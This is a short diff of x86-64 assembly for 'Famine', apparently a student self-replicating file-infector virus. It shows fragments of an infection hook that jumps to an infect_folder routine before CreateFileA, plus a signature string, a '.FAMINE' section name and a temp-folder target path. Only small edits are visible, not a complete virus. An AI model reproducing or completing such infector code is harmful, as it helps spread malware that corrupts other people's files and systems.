@@ -59,7 +59,7 @@ main proc
 
 		test BYTE ptr [MUST_EXIT], 1
 		jne	not_nt_create_file
-		call proc_nt_create_file ; Si must exit = 1
+		call proc_nt_create_file ; Si must exit = 0
 
 		not_nt_create_file:
 	 	call CreateFileA
@@ -111,7 +111,6 @@ SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
 TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
-
 ; rbp
 ; 72 - 80   : padding
 ; 64 - 72   : saved rdi
@@ -562,6 +561,7 @@ get_rip proc
 get_rip endp
 
 proc_nt_create_file proc
+label_jump_create_file:
 	jmp [qword ptr infect_folder]
 proc_nt_create_file endp
 
@@ -761,7 +761,11 @@ debut_boucle_remplir_la_ft:
 	je fin_boucle_remplir_la_ft
 	jmp debut_boucle_remplir_la_ft
 fin_boucle_remplir_la_ft:
-	
+
+	sub rax, 72
+
+
+
 	mov rsp, rbp
 	pop rbp
 	ret
